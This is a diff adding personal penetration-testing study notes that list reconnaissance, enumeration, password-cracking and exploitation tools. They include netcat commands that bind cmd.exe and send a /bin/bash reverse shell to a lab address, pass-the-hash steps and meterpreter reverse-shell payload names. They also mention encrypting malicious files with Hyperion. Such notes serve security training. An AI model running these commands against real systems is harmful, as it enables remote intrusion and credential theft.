@@ -1,0 +1,46 @@
+1. use of grep, cut -d " " -f 3, sort -u, uniq 
+2. using netcat
+3. for osint- Google hacking database GHDB
+    google hints filetype:pdf
+4. for osint - netcraft
+5.  nc -nlvp 4444 -e cmd.exe for binding command prompt in windows to netcat
+    nc -nv 10.10.10.87 11111 for establishing connection with the server
+    nc -nv 10.10.10.87 11111 -e /bin/bash to forward a reverse shell
+6. sbd and ncat gives the encrypted packets.
+7. You can use tcpdump to filter data and filter heaader data too
+8. DNS brute force using ho
+9. zone transfers - database replication act between related DNS servers
+10. smb enumeration can be  done with nmap and nbtscan
+11. smtp enumeration
+12. Data execution prevention
+13. ASLR - address space layout randomization
+
+//// not done buffer overflow in windows and linux
+
+14. Bad characters fuzzing
+15. mingcw cross compiler
+16. Uploading files with tftpd
+17. FTP -h in windows
+18. Pure ftp in kali
+
+//// uploading files via vbscript,powershell and deug.exe
+//// privilege escalation
+19. sqlmap for sql injections
+20. Rainbow table attack for Security accounts Manager
+problem with non salted hashes
+21. cewl > for creating passwords from a web page
+22. rdp > ncrack
+23. snmp,ssh > hydra
+24. http > medusa
+25. John the ripper for hash cracks
+26. pth-winexe pass the hash
+Password hashes are loaded into the Local Security Authority Subsystem (Lsass). 
+Pass-the-hash: Too ls and Mitigation10Bashar  Ewaida,  bashar9090@live.com1)The attacker obtains the hashes, by dumping passwords hashes from "Victim" server.2)The attacker, using pass-the-hash tools, can place one of the hashes he obtained (preferably for a user with administrative privileges) in his local Lsass.3)Going forward, Windowswill automatically provide the new credentials on the attacker’s behalf whenever the attacker tries to access the "Victim" server without the need to provide a password.
+
+27. rinetd - port forwarding
+28. staged non staged payload meterpreter
+    windows/shell/reverse_tcp - staged
+    windows/shell_reverse_tcp - non staged
+29. Hyperion - for encrypting the malicious files
+30. oclhashcat for password cracking
+31.  
